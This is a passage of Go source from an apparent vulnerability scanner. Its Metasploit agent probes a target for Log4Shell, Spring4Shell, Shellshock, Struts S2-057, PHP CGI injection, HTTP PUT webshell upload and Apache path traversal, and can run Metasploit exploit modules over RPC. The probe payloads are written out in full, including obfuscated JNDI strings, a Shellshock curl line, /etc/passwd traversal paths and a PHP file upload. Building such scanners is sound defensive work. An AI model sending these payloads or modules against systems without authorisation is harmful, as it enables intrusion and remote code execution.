package agent

// MetasploitAgent drives web-exploit checks against the target using two
// complementary approaches:
//
//  1. Native Go probes — lightweight HTTP fingerprinting tests for the most
//     commonly exploited web CVEs (Log4Shell, Spring4Shell, Shellshock,
//     Apache Struts S2-057, PHP CGI injection, HTTP PUT web-shell upload,
//     CVE-2021-41773 Apache path traversal).  These run without any external
//     dependency and always execute.
//
//  2. Metasploit RPC — when MSF_RPC_URL is set in the environment the agent
//     authenticates to a running `msfrpcd` daemon and runs a curated set of
//     web auxiliary/exploit modules against the target URL.  The agent is
//     fully functional without this; it just skips the RPC phase and reports
//     an info finding.
//
// The sidecar pattern is identical to sqlmap/nikto: a long-lived
// metasploitframework/metasploit-framework container kept alive with
// `tail -f /dev/null`, with `msfrpcd` started inside it. The backend reaches
// it through MSF_RPC_URL (e.g. http://metasploit:55553).

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scanner"
)

// metasploitNativeProbeCount is the number of native Go probe functions called
// in MetasploitAgent.Run. Update this constant whenever a probe is added or removed.
const metasploitNativeProbeCount = 13

// MetasploitAgent orchestrates Metasploit-based web exploit checks.
type MetasploitAgent struct {
	enabled bool
}

func NewMetasploitAgent(enabled bool) *MetasploitAgent {
	return &MetasploitAgent{enabled: enabled}
}

func (a *MetasploitAgent) Name() string  { return "metasploit" }
func (a *MetasploitAgent) Enabled() bool { return a.enabled }

func (a *MetasploitAgent) Run(ctx context.Context, input AgentInput) (AgentOutput, error) {
	output := AgentOutput{
		AgentName: a.Name(),
		Findings:  make([]model.Finding, 0),
		Metadata:  make(map[string]string),
		Status:    "completed",
	}

	client := &http.Client{
		Timeout: 12 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) < 3 {
				return nil
			}
			return http.ErrUseLastResponse
		},
	}

	// ── Phase 1: native Go web exploit probes ─────────────────────────────
	output.Findings = append(output.Findings, probeLog4Shell(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeSpring4Shell(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeShellshock(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeApacheStrutsS2057(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probePHPCGIInjection(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeHTTPPutWebshell(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeApachePathTraversal(ctx, client, input.Target, input.AuthProfile)...)
	// Extended exploit probes (added in phase-2 expansion)
	output.Findings = append(output.Findings, probeDrupalgeddon2(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeConfluenceOGNL(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeJenkinsScriptConsole(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeCitrixADCTraversal(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeThinkPHPRCE(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, probeExchangeProxyLogon(ctx, client, input.Target, input.AuthProfile)...)

	// ── Phase 2: Metasploit RPC (optional, when msfrpcd is reachable) ─────
	msfURL := strings.TrimSpace(os.Getenv("MSF_RPC_URL"))
	msfPass := strings.TrimSpace(os.Getenv("MSF_RPC_PASSWORD"))
	if msfURL != "" {
		rpcFindings, note := runMSFRPCModules(ctx, client, msfURL, msfPass, input.Target, input.AuthProfile)
		output.Findings = append(output.Findings, rpcFindings...)
		output.Metadata["msf_rpc_note"] = note
	} else {
		output.Findings = append(output.Findings, model.Finding{
			ID:          "metasploit-rpc-not-configured",
			Category:    "integration",
			Severity:    model.SeverityInfo,
			Title:       "Metasploit RPC not configured",
			Description: "Set MSF_RPC_URL (e.g. http://metasploit:55553) and MSF_RPC_PASSWORD to enable live Metasploit module execution via msfrpcd. Native web exploit probes still ran.",
			Evidence:    "MSF_RPC_URL env var is empty",
			Recommendation: "Start msfrpcd inside the metasploit sidecar: " +
				"`msfrpcd -P <password> -S false -a 0.0.0.0 -p 55553` and set MSF_RPC_URL in the backend environment.",
		})
	}

	output.Metadata["native_probes_run"] = fmt.Sprintf("%d", metasploitNativeProbeCount)
	output.Metadata["findings_count"] = fmt.Sprintf("%d", len(output.Findings))
	output.DebugNotes = "Metasploit agent: native CVE probes + optional msfrpc module execution."
	return output, nil
}

// ── Native Go probes ──────────────────────────────────────────────────────────

// probeLog4Shell sends payloads that trigger Log4j JNDI lookups (CVE-2021-44228).
// A real OOB callback would require an attacker-controlled LDAP server; we
// instead look for error messages or reflection of the literal ${jndi: string
// that some WAFs/JEEs echo back, or a 5xx that differs from baseline.
func probeLog4Shell(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Payload string: real exploitation requires OAST but we can detect
	// WAF-bypass differences and echo-based reflection.
	payloads := []struct {
		header  string
		payload string
	}{
		{"X-Api-Version", "${jndi:ldap://127.0.0.1/a}"},
		{"User-Agent", "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/a}"},
		{"Referer", "${jndi:${lower:l}${lower:d}ap://127.0.0.1/a}"},
		{"X-Forwarded-For", "${jndi:ldap://127.0.0.1:1389/a}"},
	}

	// Baseline request to detect anomalies.
	baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return nil
	}
	scanner.ApplyAuthProfile(baseReq, profile)
	baseResp, err := client.Do(baseReq)
	if err != nil {
		return nil
	}
	io.Copy(io.Discard, baseResp.Body) //nolint:errcheck
	baseResp.Body.Close()
	baseStatus := baseResp.StatusCode

	for _, p := range payloads {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)
		req.Header.Set(p.header, p.payload)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Heuristics: reflected payload string OR status flip to 5xx when
		// baseline was not 5xx (the JNDI lookup caused an internal error).
		reflected := strings.Contains(bodyStr, "jndi") || strings.Contains(bodyStr, "${")
		statusFlip := resp.StatusCode >= 500 && baseStatus < 500

		if reflected || statusFlip {
			reason := "status-flip"
			if reflected {
				reason = "jndi-payload-reflected"
			}
			return []model.Finding{{
				ID:          "msf-log4shell",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Log4Shell (CVE-2021-44228) indicator detected",
				Description: "The target exhibits behaviour consistent with a Log4j JNDI injection vulnerability. A JNDI lookup payload injected via HTTP headers triggered an anomalous response (reflected payload or server error).",
				Evidence:    fmt.Sprintf("header=%s payload=%q indicator=%s response_status=%d baseline_status=%d", p.header, p.payload, reason, resp.StatusCode, baseStatus),
				Recommendation: "Upgrade Log4j to ≥2.17.1 (Java 8) or ≥2.12.4 (Java 7). " +
					"Set log4j2.formatMsgNoLookups=true as an interim mitigation. " +
					"Enforce egress firewall rules to prevent outbound LDAP/RMI connections.",
				AffectedURL:   target,
				OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:           "CWE-917",
				CVSSScore:     10.0,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1059.007"},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
					"https://www.rapid7.com/db/modules/exploit/multi/http/log4shell_header_injection/",
				},
			}}
		}
	}
	return nil
}

// probeSpring4Shell sends a class.module.classLoader payload to Spring MVC
// endpoints (CVE-2022-22965). Vulnerable apps bind the parameter without
// restriction and may expose a server error or reflect the param name.
func probeSpring4Shell(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// The canonical exploit attempts to write a JSP webshell via the
	// classLoader.resources.context.parent.pipeline.first.* chain.
	// We probe with a safe read-only variant and look for the parameter
	// name reflected or for a 4xx→5xx status change.
	probeParams := []string{
		"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
		"class.module.classLoader.urls[0]=jar:file:///etc/passwd!/",
	}

	baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return nil
	}
	scanner.ApplyAuthProfile(baseReq, profile)
	baseResp, err := client.Do(baseReq)
	if err != nil {
		return nil
	}
	io.Copy(io.Discard, baseResp.Body) //nolint:errcheck
	baseResp.Body.Close()
	baseStatus := baseResp.StatusCode

	for _, qp := range probeParams {
		sep := "?"
		if strings.Contains(target, "?") {
			sep = "&"
		}
		probeURL := target + sep + qp

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))
		reflected := strings.Contains(bodyStr, "classloader") || strings.Contains(bodyStr, "pipeline")
		statusFlip := resp.StatusCode >= 500 && baseStatus < 500

		if reflected || statusFlip {
			reason := "status-flip"
			if reflected {
				reason = "classloader-keyword-reflected"
			}
			return []model.Finding{{
				ID:          "msf-spring4shell",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Spring4Shell (CVE-2022-22965) indicator detected",
				Description: "A Spring Framework class-loader manipulation probe produced an anomalous response. This is a strong indicator of CVE-2022-22965 (Spring4Shell), which allows unauthenticated remote code execution.",
				Evidence:    fmt.Sprintf("probe_param=%q indicator=%s response_status=%d baseline_status=%d", qp, reason, resp.StatusCode, baseStatus),
				Recommendation: "Upgrade Spring Framework to ≥5.3.18 / ≥5.2.20. " +
					"Upgrade Spring Boot to ≥2.6.6 / ≥2.5.12. " +
					"Apply the @InitBinder DataBinder.setDisallowedFields workaround.",
				AffectedURL:    probeURL,
				OWASPCategory:  "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:            "CWE-94",
				CVSSScore:      9.8,
				CVSSVector:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190"},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2022-22965",
					"https://www.rapid7.com/db/modules/exploit/multi/http/spring_framework_rce_spring4shell/",
				},
			}}
		}
	}
	return nil
}

// probeShellshock sends a bash function definition in HTTP headers
// (CVE-2014-6271). A vulnerable CGI server will execute the injected command.
// We look for the canary string "SHELLSHOCK" in the response body.
func probeShellshock(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	u, err := url.Parse(target)
	if err != nil {
		return nil
	}

	// Common CGI paths to probe.
	cgiPaths := []string{"/cgi-bin/test-cgi", "/cgi-bin/status", "/cgi-bin/printenv", "/cgi-bin/env.sh"}

	canary := "SHELLSHOCK_CANARY_8f3a2b"
	header := fmt.Sprintf("() { ignored; }; echo; echo %s", canary)

	for _, path := range cgiPaths {
		u.Path = path
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)
		req.Header.Set("User-Agent", header)
		req.Header.Set("Referer", header)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		if strings.Contains(string(body), canary) {
			return []model.Finding{{
				ID:          "msf-shellshock",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Shellshock (CVE-2014-6271) Remote Code Execution",
				Description: "The target executed a bash function injected via an HTTP header, confirming Shellshock vulnerability (CVE-2014-6271/CVE-2014-7169). Attackers can run arbitrary OS commands without authentication.",
				Evidence:    fmt.Sprintf("path=%s canary=%q found_in_response=true", path, canary),
				Recommendation: "Upgrade bash to a patched version. Replace CGI scripts with FCGI or modern server-side handlers. Disable CGI execution if not needed.",
				AffectedURL:    u.String(),
				OWASPCategory:  "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:            "CWE-78",
				CVSSScore:      10.0,
				CVSSVector:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1059.004"},
				ReproductionSteps: []string{
					fmt.Sprintf(`curl -H 'User-Agent: () { ignored; }; echo; echo %s' %s`, canary, u.String()),
					fmt.Sprintf("Observe %q in the response body", canary),
				},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
					"https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec/",
				},
			}}
		}
	}
	return nil
}

// probeApacheStrutsS2057 tests for CVE-2018-11776 (Struts S2-057) by injecting
// a namespace OGNL expression and looking for calculator / command output.
func probeApacheStrutsS2057(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// The exploit crafts a URL like /${%23context['com.opensymphony...']...}/index.action
	// We use a safe read-only OGNL expression that returns a known string.
	canary := "s2057probe"
	ognlPaths := []string{
		"/${%23context[\"com.opensymphony.xwork2.ActionContext.container\"]}/",
		"/%24%7B%23context%5B%22s2057%22%5D%7D/index.action",
	}

	baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return nil
	}
	scanner.ApplyAuthProfile(baseReq, profile)
	baseResp, err := client.Do(baseReq)
	if err != nil {
		return nil
	}
	io.Copy(io.Discard, baseResp.Body) //nolint:errcheck
	baseResp.Body.Close()
	baseStatus := baseResp.StatusCode
	_ = canary

	base := strings.TrimRight(target, "/")
	for _, suffix := range ognlPaths {
		probeURL := base + suffix

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Struts errors on OGNL eval often expose "ognl", "struts", or
		// "com.opensymphony" in the response body / stack trace.
		strutsIndicators := []string{"ognl", "struts", "opensymphony", "xwork"}
		found := ""
		for _, ind := range strutsIndicators {
			if strings.Contains(bodyStr, ind) {
				found = ind
				break
			}
		}
		statusFlip := resp.StatusCode >= 500 && baseStatus < 500

		if found != "" || statusFlip {
			reason := "status-flip"
			if found != "" {
				reason = "struts-keyword:" + found
			}
			return []model.Finding{{
				ID:          "msf-struts-s2057",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Apache Struts S2-057 (CVE-2018-11776) OGNL injection indicator",
				Description: "A namespace OGNL injection probe produced a response consistent with Apache Struts 2 S2-057 (CVE-2018-11776), which allows unauthenticated remote code execution via OGNL expression evaluation.",
				Evidence:    fmt.Sprintf("probe_path=%q indicator=%s response_status=%d baseline_status=%d", suffix, reason, resp.StatusCode, baseStatus),
				Recommendation: "Upgrade Apache Struts to ≥2.3.35 or ≥2.5.17. " +
					"Set `struts.mapper.alwaysSelectFullNamespace` to `false`.",
				AffectedURL:    probeURL,
				OWASPCategory:  "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:            "CWE-20",
				CVSSScore:      10.0,
				CVSSVector:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190"},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2018-11776",
					"https://www.rapid7.com/db/modules/exploit/multi/http/struts2_namespace_ognl/",
				},
			}}
		}
	}
	return nil
}

// probePHPCGIInjection probes for PHP CGI argument injection (CVE-2012-1823).
// Sending ?-s to a PHP CGI binary causes it to output the PHP source code.
func probePHPCGIInjection(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Appending ?-s causes PHP CGI to output source; ?-d+allow_url_fopen%3d1 overrides INI.
	probes := []struct {
		query    string
		keyword  string
		severity model.Severity
	}{
		{"?-s", "<?php", model.SeverityHigh},
		{"?-d+display_errors%3d1", "parse error", model.SeverityMedium},
		{"?-d+allow_url_fopen%3d1%26-d+allow_url_include%3d1", "warning", model.SeverityMedium},
	}

	phpPaths := []string{"/index.php", "/cgi-bin/php", "/cgi-bin/php5", "/cgi-bin/php-cgi"}
	u, err := url.Parse(target)
	if err != nil {
		return nil
	}

	for _, path := range phpPaths {
		for _, probe := range probes {
			u.Path = path
			u.RawQuery = ""
			probeURL := u.String() + probe.query

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
			resp.Body.Close()

			if strings.Contains(strings.ToLower(string(body)), probe.keyword) {
				return []model.Finding{{
					ID:          "msf-php-cgi-injection",
					Category:    "remote_code_execution",
					Severity:    probe.severity,
					Title:       "PHP CGI Argument Injection (CVE-2012-1823)",
					Description: "The target PHP CGI binary accepts command-line arguments via the query string. This allows remote attackers to execute arbitrary PHP code or read PHP source files.",
					Evidence:    fmt.Sprintf("path=%s query=%q keyword=%q found=true", path, probe.query, probe.keyword),
					Recommendation: "Upgrade PHP to a patched version (≥5.3.13 / ≥5.4.3). " +
						"Configure the web server to strip query strings containing command-line switches. " +
						"Avoid using PHP CGI; prefer PHP-FPM.",
					AffectedURL:    probeURL,
					OWASPCategory:  "OWASP A06:2021 - Vulnerable and Outdated Components",
					CWE:            "CWE-88",
					CVSSScore:      7.5,
					CVSSVector:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
					MITRETechniques: []string{"T1190"},
					References: []string{
						"https://nvd.nist.gov/vuln/detail/CVE-2012-1823",
						"https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection/",
					},
				}}
			}
		}
	}
	return nil
}

// probeHTTPPutWebshell attempts to upload a minimal PHP webshell via HTTP PUT.
// If the server accepts the file, a follow-up GET attempts to execute it.
func probeHTTPPutWebshell(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	u, err := url.Parse(target)
	if err != nil {
		return nil
	}

	// Upload paths. We try under /uploads and /webdav as most misconfigured
	// Apache/IIS instances expose writable WebDAV directories there.
	uploadTargets := []string{
		"/uploads/abh_probe_8f3a2b.php",
		"/webdav/abh_probe_8f3a2b.php",
		"/public/abh_probe_8f3a2b.php",
	}
	// Minimal PHP canary — outputs a known string then exits; no persistent access.
	webshellBody := "<?php echo 'HTTPPUT_PROBE_8f3a2b'; ?>"
	canary := "HTTPPUT_PROBE_8f3a2b"

	for _, uploadPath := range uploadTargets {
		u.Path = uploadPath
		uploadURL := u.String()

		putReq, err := http.NewRequestWithContext(ctx, http.MethodPut, uploadURL, strings.NewReader(webshellBody))
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(putReq, profile)
		putReq.Header.Set("Content-Type", "application/octet-stream")

		putResp, err := client.Do(putReq)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, putResp.Body) //nolint:errcheck
		putResp.Body.Close()

		// Consider 2xx (including 201 Created) as a successful PUT.
		if putResp.StatusCode < 200 || putResp.StatusCode >= 300 {
			continue
		}

		// Confirm execution by GETting the uploaded file.
		getReq, err := http.NewRequestWithContext(ctx, http.MethodGet, uploadURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(getReq, profile)

		getResp, err := client.Do(getReq)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(getResp.Body, 4096))
		getResp.Body.Close()

		// Attempt cleanup (best-effort DELETE) regardless of execution result.
		delReq, err := http.NewRequestWithContext(ctx, http.MethodDelete, uploadURL, nil)
		if err == nil {
			scanner.ApplyAuthProfile(delReq, profile)
			delResp, err := client.Do(delReq)
			if err == nil {
				io.Copy(io.Discard, delResp.Body) //nolint:errcheck
				delResp.Body.Close()
			}
		}

		// If body contains the canary, PHP was executed — full RCE.
		if strings.Contains(string(body), canary) {
			return []model.Finding{{
				ID:          "msf-http-put-webshell",
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "HTTP PUT webshell upload and execution confirmed",
				Description: "The server accepted an unauthenticated HTTP PUT request and subsequently executed the uploaded PHP file, confirming arbitrary remote code execution. This is consistent with misconfigured WebDAV or Apache `mod_dav`.",
				Evidence:    fmt.Sprintf("upload_url=%s put_status=%d get_canary_found=true", uploadURL, putResp.StatusCode),
				Recommendation: "Disable HTTP PUT/WebDAV if not required. If WebDAV is needed, enforce strong authentication and restrict writable directories. Block server-side execution in upload directories.",
				AffectedURL:    uploadURL,
				OWASPCategory:  "OWASP A05:2021 - Security Misconfiguration",
				CWE:            "CWE-434",
				CVSSScore:      9.8,
				CVSSVector:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1505.003"},
				References: []string{
					"https://www.rapid7.com/db/modules/exploit/unix/http/apache_mod_cgi_bash_env_exec/",
					"https://cwe.mitre.org/data/definitions/434.html",
				},
			}}
		}

		// PUT accepted but execution failed — still a misconfiguration finding.
		return []model.Finding{{
			ID:          "msf-http-put-allowed",
			Category:    "security_misconfiguration",
			Severity:    model.SeverityMedium,
			Title:       "Unauthenticated HTTP PUT method allowed",
			Description: "The server accepted an unauthenticated HTTP PUT request. Although the uploaded PHP file was not executed (possibly due to no PHP handler in that directory), arbitrary file upload could still lead to data tampering or code execution in another context.",
			Evidence:    fmt.Sprintf("upload_url=%s put_status=%d php_executed=false", uploadURL, putResp.StatusCode),
			Recommendation: "Disable HTTP PUT/DELETE/WebDAV methods unless explicitly required. Enforce authentication before accepting any write operations.",
			AffectedURL:    uploadURL,
			OWASPCategory:  "OWASP A05:2021 - Security Misconfiguration",
			CWE:            "CWE-434",
		}}
	}
	return nil
}

// probeApachePathTraversal probes for CVE-2021-41773 / CVE-2021-42013 — Apache
// 2.4.49/2.4.50 path traversal and RCE via mod_cgi.
func probeApachePathTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	traversalPaths := []struct {
		path    string
		keyword string
	}{
		{"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:"},
		{"/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd", "root:"},
		{"/.%2e/.%2e/.%2e/.%2e/etc/passwd", "root:"},
	}

	u, err := url.Parse(target)
	if err != nil {
		return nil
	}

	for _, probe := range traversalPaths {
		u.Path = ""
		u.RawQuery = ""
		probeURL := strings.TrimRight(u.String(), "/") + probe.path

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()

		if strings.Contains(string(body), probe.keyword) {
			return []model.Finding{{
				ID:          "msf-apache-path-traversal",
				Category:    "path_traversal",
				Severity:    model.SeverityHigh,
				Title:       "Apache 2.4.49/50 Path Traversal (CVE-2021-41773 / CVE-2021-42013)",
				Description: "A path traversal probe successfully read /etc/passwd via a percent-encoded dot-dot sequence. Apache 2.4.49 and 2.4.50 fail to normalise these sequences, enabling unauthenticated directory traversal and, when mod_cgi is enabled, remote code execution.",
				Evidence:    fmt.Sprintf("probe_path=%s keyword=%q found_in_response=true", probe.path, probe.keyword),
				Recommendation: "Upgrade Apache HTTP Server to ≥2.4.51 immediately. " +
					"Set `Require all denied` on all directories unless explicitly needed. " +
					"Disable mod_cgi if not required.",
				AffectedURL:    probeURL,
				OWASPCategory:  "OWASP A06:2021 - Vulnerable and Outdated Components",
				CWE:            "CWE-22",
				CVSSScore:      9.8,
				CVSSVector:     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				MITRETechniques: []string{"T1190", "T1083"},
				ReproductionSteps: []string{
					fmt.Sprintf("curl -v '%s'", probeURL),
					"Observe /etc/passwd content in the response body",
				},
				References: []string{
					"https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
					"https://www.rapid7.com/db/modules/exploit/multi/http/apache_normalize_path_rce/",
				},
			}}
		}
	}
	return nil
}

// ── Metasploit RPC ────────────────────────────────────────────────────────────

// msfRPCResponse is the minimal shape returned by msfrpcd JSON-RPC calls.
type msfRPCResponse struct {
	Result  string                 `json:"result"`
	Token   string                 `json:"token"`
	Error   bool                   `json:"error"`
	Message string                 `json:"message"`
	Data    map[string]interface{} `json:"data"`
}

// runMSFRPCModules authenticates to msfrpcd, runs a curated set of web
// auxiliary modules against the target, and returns findings.
func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password, target string, profile model.ScanAuthProfile) ([]model.Finding, string) {
	// ── 1. Authenticate ───────────────────────────────────────────────────
	if password == "" {
		password = os.Getenv("MSF_RPC_PASSWORD")
	}

	token, err := msfAuth(ctx, client, rpcURL, password)
	if err != nil {
		return nil, fmt.Sprintf("msfrpc auth failed: %v", err)
	}

	// ── 2. Parse target URL ───────────────────────────────────────────────
	u, err := url.Parse(target)
	if err != nil {
		return nil, "invalid target URL"
	}
	rhost := u.Hostname()
	rport := u.Port()
	if rport == "" {
		if u.Scheme == "https" {
			rport = "443"
		} else {
			rport = "80"
		}
	}
	ssl := "false"
	if u.Scheme == "https" {
		ssl = "true"
	}

	// ── 3. Module set — web auxiliary modules that are safe to run ─────────
	modules := []struct {
		name    string
		options map[string]string
		title   string
		cve     string
	}{
		{
			name:    "auxiliary/scanner/http/apache_normalize_path",
			title:   "Apache 2.4.49/50 Path Traversal (CVE-2021-41773)",
			cve:     "CVE-2021-41773",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "auxiliary/scanner/http/log4shell_scanner",
			title:   "Log4Shell Scanner (CVE-2021-44228)",
			cve:     "CVE-2021-44228",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "HTTP_METHOD": "GET"},
		},
		{
			name:    "auxiliary/scanner/http/springcloud_gateway_rce",
			title:   "Spring Cloud Gateway RCE (CVE-2022-22947)",
			cve:     "CVE-2022-22947",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "auxiliary/scanner/http/http_put",
			title:   "HTTP PUT File Upload",
			cve:     "",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "auxiliary/scanner/http/shellshock",
			title:   "Shellshock (CVE-2014-6271) Scanner",
			cve:     "CVE-2014-6271",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "exploit/multi/http/drupal_drupalgeddon2",
			title:   "Drupalgeddon2 RCE (CVE-2018-7600)",
			cve:     "CVE-2018-7600",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
		},
		{
			name:    "exploit/multi/http/confluence_ognl_injection",
			title:   "Confluence OGNL Injection RCE (CVE-2022-26134)",
			cve:     "CVE-2022-26134",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "exploit/multi/http/jenkins_script_console",
			title:   "Jenkins Groovy Script Console RCE",
			cve:     "",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "auxiliary/scanner/http/citrix_dir_traversal",
			title:   "Citrix ADC Directory Traversal (CVE-2019-19781)",
			cve:     "CVE-2019-19781",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "auxiliary/scanner/http/exchange_proxylogon",
			title:   "Exchange Server ProxyLogon SSRF (CVE-2021-26855)",
			cve:     "CVE-2021-26855",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
		{
			name:    "auxiliary/scanner/http/wp_xmlrpc_pingback_access",
			title:   "WordPress XML-RPC Pingback SSRF",
			cve:     "",
			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
		},
	}

	findings := make([]model.Finding, 0)
	ranModules := 0

	for _, mod := range modules {
		result, err := msfRunModule(ctx, client, rpcURL, token, mod.name, mod.options)
		if err != nil {
			// Module may not exist in this Metasploit version; skip.
			continue
		}
		ranModules++

		// Interpret the module result and convert to a Finding.
		resultStr := strings.ToLower(fmt.Sprintf("%v", result))
		vulnerable := strings.Contains(resultStr, "vulnerable") ||
			strings.Contains(resultStr, "exploited") ||
			strings.Contains(resultStr, "success")

		if vulnerable {
			f := model.Finding{
				ID:          "msf-rpc-" + strings.ReplaceAll(mod.name, "/", "-"),
				Category:    "remote_code_execution",
				Severity:    model.SeverityHigh,
				Title:       "Metasploit module confirmed: " + mod.title,
				Description: fmt.Sprintf("Metasploit module %s reported the target as vulnerable.", mod.name),
				Evidence:    fmt.Sprintf("module=%s rhost=%s rport=%s result=%v", mod.name, rhost, rport, result),
				Recommendation: "Apply the vendor patch immediately. " +
					"See module references for remediation guidance.",
				AffectedURL:   target,
				OWASPCategory: "OWASP A06:2021 - Vulnerable and Outdated Components",
				MITRETechniques: []string{"T1190"},
			}
			if mod.cve != "" {
				f.References = []string{
					"https://nvd.nist.gov/vuln/detail/" + mod.cve,
					"https://www.rapid7.com/db/modules/" + mod.name + "/",
